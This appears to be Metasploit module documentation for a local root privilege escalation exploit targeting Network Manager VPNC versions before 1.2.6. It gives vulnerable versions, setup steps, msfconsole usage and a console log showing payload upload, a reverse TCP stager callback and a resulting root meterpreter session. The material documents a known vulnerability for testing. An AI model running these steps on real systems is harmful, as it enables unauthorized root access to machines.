## Description

  This module exploits an injection vulnerability in the Network Manager
  VPNC plugin to gain *root* privileges.

  This module uses a new line injection vulnerability in the configured
  username for a VPN network connection to inject a `Password helper`
  configuration directive into the connection configuration.

  The specified helper is executed by Network Manager as root when the
  connection is started.

  Network Manager VPNC versions prior to 1.2.6 are vulnerable.


## Vulnerable Application

  This module has been tested successfully with VPNC versions:

  * 1.2.4-4 on Debian 9.0.0 (x64); and
  * 1.1.93-1 on Ubuntu Linux 16.04.4 (x64).


## Installation

  The following installation instructions are for Ubuntu 16.04.04.

  ```sh
  # List available network-manager-vpnc packages
  apt-cache showpkg network-manager-vpnc

  # Install a vulnerable package
  apt-get install network-manager-vpnc=1.1.93-1
  ```


## Verification Steps

  1. Start `msfconsole`
  2. Get a session
  3. Do: `use exploit/linux/local/network_manager_vpnc_username_priv_esc`
  4. Do: `set SESSION [SESSION]`
  5. Do: `run`
  6. You should get a new *root* session


## Options

  **SESSION**

  Which session to use, which can be viewed with `sessions`

  **WritableDir**

  A writable directory file system path. (default: `/tmp`)


## Scenarios

  ```
  msf5 > use exploit/linux/local/network_manager_vpnc_username_priv_esc 
  msf5 exploit(linux/local/network_manager_vpnc_username_priv_esc) > set session 1
  session => 1
  msf5 exploit(linux/local/network_manager_vpnc_username_priv_esc) > set verbose true
  verbose => true
  msf5 exploit(linux/local/network_manager_vpnc_username_priv_esc) > set lhost 172.16.191.188 
  lhost => 172.16.191.188
  msf5 exploit(linux/local/network_manager_vpnc_username_priv_esc) > run

  [*] Started reverse TCP handler on 172.16.191.188:4444 
  [+] nmcli utility is installed
  [*] Adding VPN connection...
  [*] Uploading payload...
  [*] Writing '/tmp/.4FCA0Pp4tw' (237 bytes) ...
  [*] Starting VPN connection...
  [*] Transmitting intermediate stager...(106 bytes)
  [*] Sending stage (861480 bytes) to 172.16.191.201
  [+] Deleted /tmp/.4FCA0Pp4tw
  [*] Removing VPN connection...

  meterpreter > getuid
  Server username: uid=0, gid=0, euid=0, egid=0
  meterpreter > sysinfo
  Computer     : 172.16.191.201
  OS           : Ubuntu 16.04 (Linux 4.13.0-41-generic)
  Architecture : x64
  BuildTuple   : i486-linux-musl
  Meterpreter  : x86/linux
  meterpreter > 
  ```

